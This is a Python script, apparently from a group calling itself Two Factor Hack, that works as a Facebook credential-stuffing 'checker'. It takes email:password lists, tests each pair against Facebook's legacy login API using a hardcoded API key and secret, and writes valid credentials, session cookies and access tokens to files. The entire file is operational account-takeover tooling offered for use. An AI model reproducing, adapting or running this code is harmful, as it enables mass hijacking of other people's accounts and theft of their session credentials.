# ################################################### #
#                                                     #
#           ..#######..########.##.....##             #
#           .##.....##.##.......##.....##             #
#           ........##.##.......##.....##             #
#           ..#######..######...#########             #
#           .##........##.......##.....##             #
#           .##........##.......##.....##             #
#           .#########.##.......##.....##             #
#                                                     #
#       Facebook checker v2.0 - coded by 2FH          #
#                                                     #
#   Proyecto: Facebook checker                        #
#   Autores: def Empty(): - YaderPR~                  #
#   Grupo: Two Factor Hack (2FH)                      #
#   Hora: 7:17 PM                                     #
#   Fecha: 21 de Julio del 2020.                      #
#                                                     #
# ################################################### #

try:
    
    import argparse, requests, base64, os, json, hashlib
    from modules.funcshits import credsFilter, listFilter
    import modules.colors as color
    import modules.banner as banner

except:
    
    print(color.Color().rojo + "¡Error al importar librerias!\nEjecuta pip3 install -r requeriments.txt ó pip install -r requeriments.txt" + color.Color().reset);
    exit();

class Checker():

    def __init__(self, email, passw):
    
        self.set = color.Color();
    
        self.email = email;
        self.passw = passw;

        self.checkpoint = False;
        self.cookies = "";
        self.access_token = "";
        
        self.hits = 0;
        self.bads = 0;

        self.outputDir = "output";
        self.detailsDir = "details";
        self.detailsFile = "";
        self.hitsFile = "checked.txt";
    
        self.url = "https://api.facebook.com/";
        self.url_login = "https://api.facebook.com/restserver.php";
        self.API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32";
        self.user_agent = {'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36'};

    def saveHit(self):

        try: os.stat(self.outputDir);
        except: os.mkdir(self.outputDir);

        try: os.stat(self.outputDir + "/" + self.detailsDir);
        except: os.mkdir(self.outputDir + "/" + self.detailsDir);

        detailsFile = open(self.outputDir + "/" + self.detailsDir + "/" + self.detailsFile, "a+") 

        detailsFile.write("# Credenciales\n\nCorreo -> " + self.email + "\nContraseña -> " + self.passw + "\n\n# Control de seguridad (" + ("DETECTADO)\n\n" if (self.checkpoint) else "NO DETECTADO)\n\n# Cookies\n\n" + self.cookies + "\n\n# Token de acceso\n\n" + self.access_token + "\n\n"))
        detailsFile.close();

        hitsFile = open(self.outputDir + "/" + self.hitsFile, "a+");
                
        hitsFile.write(self.email + ":" + self.passw + "\n");
        hitsFile.close();

        self.hits += 1;

    def finish(self):

        print(self.set.verde + "Total de credenciales correctas: " + str(self.hits) + self.set.reset);
        print(self.set.rojo + "Total de credenciales incorrectas: " + str(self.bads) + self.set.reset);
        print(self.set.morado + "Total de credenciales testeadas: " + str((self.hits + self.bads)) + self.set.reset + "\n");

        if (self.hits > 0): print(self.set.verde + "¡Las credenciales correctas y detalles se han guardado en el directorio " + self.set.azul + self.outputDir + "/" + self.set.verde + "!\n" + self.set.reset);

    def tryToConnect(self):

        session = requests.session();

        try:

            print(self.set.amarillo + "Estableciendo conexión con facebook... ", end = "" + self.set.reset);

            request = session.get(self.url, headers = self.user_agent);

            data = {"api_key" : "882a8490361da98702bf97a021ddc14d", "credentials_type" : "password", "email" : self.email, "format" : "JSON", "generate_machine_id" : "1", "generate_session_cookies" : "1", "locale" : "en_US", "method" : "auth.login", "password" : self.passw, "return_ssl_resources" : "0", "v" : "1.0"};
            sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=" + self.email + "format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=" + self.passw + "return_ssl_resources=0v=1.0" + self.API_SECRET;

            x = hashlib.new('md5');
            x.update(sig.encode('utf-8'));
            data.update({'sig' : x.hexdigest()});

            print(self.set.verde + "¡Conexión exitosa!");
            print(self.set.amarillo + "Testeando credenciales... ", end = "" + self.set.reset);

            request = session.get(self.url_login, params = data, headers = self.user_agent);

            if ("c_user" in request.text): 
                
                print(self.set.verde + "¡Credeciales correctas!" + self.set.reset);
                
                jdata = json.loads(request.text);

                self.detailsFile = self.email + ".txt";
                self.checkpoint = False;
                self.cookies = "[ {\"c_user\" : \"" + str(jdata["session_cookies"][0]["value"]) + "\", \"xs\" : \"" + str(jdata["session_cookies"][1]["value"]) + "\"} ]";
                self.access_token = str(jdata["access_token"]);
                self.saveHit();

            elif (("Login Code Required" in request.text) or ("User must verify their account" in request.text)): 
                
                print(self.set.verde + "¡Credeciales correctas!\n" + self.set.reset + self.set.rojo + "¡Advertencia, control de seguridad detectado!" + self.set.reset); 
                
                self.detailsFile = self.email + ".txt";
                self.checkpoint = True;
                self.saveHit();

            else: print(self.set.rojo + "¡Credenciales incorrectas!" + self.set.reset); self.bads += 1;

            print();

        except: print(self.set.rojo + "\n¡Ha ocurrido un error al tratar de conectar con facebook!\n" + self.set.reset); exit();

def main():

    banner.show();

    set = color.Color()

    parser = argparse.ArgumentParser();
    
    parser.add_argument("-e", "--email", help = "Correo de la cuenta");
    parser.add_argument("-p", "--passw", help = "Contraseña de la cuenta");
    parser.add_argument("-l", "--list", help = "Ruta del archivo que contiene la lista de correo:contraseña" + set.reset);
    
    args = parser.parse_args();

    if ((args.email and args.passw) and (not args.list)):
        
        print(set.reset + "\nCorreo: " + set.azul + args.email + set.reset + " Contraseña: " + set.azul + args.passw + set.reset + "\n");
        
        if (credsFilter(args.email, args.passw)):

            checker = Checker(args.email, args.passw);
            checker.tryToConnect();
            checker.finish();

    elif (args.list and (not (args.email or args.passw))):

        emails, passws = listFilter(args.list);
        checker = Checker(None, None);
        
        for i in range(0, len(emails)):

            checker.email = emails[i];
            checker.passw = passws[i];

            print(set.reset + "Correo: " + set.azul + checker.email + set.reset + " Contraseña: " + set.azul + checker.passw + set.reset + "\n");

            checker.tryToConnect();

        checker.finish();

    else: print(set.amarillo); parser.print_help(); exit();

if (__name__ == "__main__"): main();